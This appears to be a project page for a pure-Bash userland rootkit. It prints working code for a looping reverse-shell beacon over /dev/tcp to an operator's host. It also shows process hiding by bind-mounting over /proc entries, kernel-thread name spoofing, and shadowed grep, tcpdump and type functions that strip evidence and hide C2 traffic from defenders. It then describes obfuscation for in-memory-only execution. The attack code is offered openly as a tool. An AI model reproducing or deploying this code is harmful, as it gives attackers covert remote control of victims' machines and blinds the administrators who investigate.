bash‑rootkit

A pure-Bash userland rootkit built from Linux tips and tricks — no compiled binaries, no kernel modules. Persists as a reverse-shell beacon, hides its own PID, and shadows common system commands to blind the defender._

// 01 — overview

What is this?

A fully self-contained userland rootkit written in pure Bash — no compiled code, no kernel exploits. Everything runs in the shell itself, which is exactly what makes it interesting: the OS's own tools are turned against the operator.

The project has three layers: a beacon script that maintains a persistent reverse shell, a set of shadowed shell functions that masquerade as real Linux commands, and THC's Bincrypter for obfuscation and in-memory-only execution.

📡

Persistent Beacon

Loops forever, reconnects on disconnect. Process name spoofed to look like a kernel worker thread.

👻

PID Hiding

Bind-mounts an empty /dev/shm dir over the process's own /proc/PID entry.

🪞

Command Shadowing

Overrides ls, ps, grep, mount, tcpdump and more — filtering out all evidence.

🔒

In-Memory Only

After Bincrypter obfuscation, the script decrypts and executes entirely in memory.

// 03 — beacon script

real_beacon

The core loop. Hides itself using /proc bind-mounts, remounts /proc with hidepid=2, names its subshell after a kernel thread, then opens a raw TCP socket to the C2 operator.

real_beacon — core loop 
# Remount /proc so other users can't enumerate PIDs
mount -o remount,hidepid=2 /proc 2>/dev/null
mtab $$   # bind-mount empty dir over our own /proc/PID

while true; do
  (
    mtab $$ 2>/dev/null

    # Spoof process name as a kernel worker thread
    FAKE_NAME="[kworker/u$(shuf -i 0-5 -n 1):$(shuf -i 0-5 -n 1)]"

    if exec 5<>/dev/tcp/$IP/$PORT 2>/dev/null; then
      echo "\nHIDDEN SHELL: $(hostname) ($(whoami))\n" >&5
      echo 'while read -r line; do $line; done' \
        | exec -a "$FAKE_NAME" sh <&5 >&5 2>&5
    fi
  ) & disown

  ssleep   # sleep with its own hidden PID
done &>/dev/null

Cleanup is handled via a trap on EXIT / SIGINT / SIGTERM — unmounting all /dev/shm bind-mounts and killing background jobs so the operator can leave a clean slate on demand.

// 04 — command shadowing

final_functions

Every common detection tool is overridden with a Bash function that calls the real binary but pipes output through grep -Ev "$_HG_P" — stripping any line matching the rootkit's fingerprint pattern. Tab-completion is preserved by checking $COMP_LINE and bypassing the filter during completions.

final_functions — shadow examples 
# Master filter pattern — every rootkit indicator in one variable
command export _HG_P="grep|ps|mount|4316|127.0.0.1|/proc/|hidepid|bash_|..."

grep() {
  [[ -n "$COMP_LINE" ]] && { /usr/bin/grep "$@"; return; }
  /usr/bin/grep "$@" | /usr/bin/grep -Ev "$_HG_P"
}

# tcpdump auto-injects a BPF expression to hide C2 traffic
tcpdump() {
  local f="not port 4316 and not host 127.0.0.1"
  [[ $# -eq 0 ]] \
    && /usr/sbin/tcpdump -i any $f 2>/dev/null \
    || /usr/sbin/tcpdump "$@" and $f 2>/dev/null
}

# type / which return fake paths so forensics look clean
type() {
  for a in "$@"; do
    case "$a" in
      grep|ps|mount|...) /usr/bin/echo "$a is /usr/bin/$a" ;;
      type|set|alias|...) /usr/bin/echo "$a is a shell builtin" ;;
      *) command builtin type "$a" 2>/dev/null ;;
    esac
  done
}
// 05 — obfuscation

THC Bincrypter

After the beacon is finalized, it's passed through THC's Bincrypter. The resulting file appears as binary noise — strings, cat, and file reveal nothing useful. At runtime the script self-decrypts into a tmpfs-backed memory region and executes there, leaving no cleartext artifact on disk.

🧩

Unreadable at rest

The script file is opaque binary. Static analysis tools and casual inspection find nothing of value.

🧠

In-memory execution

The cleartext payload lives only in RAM. No forensic image of the disk will recover it.
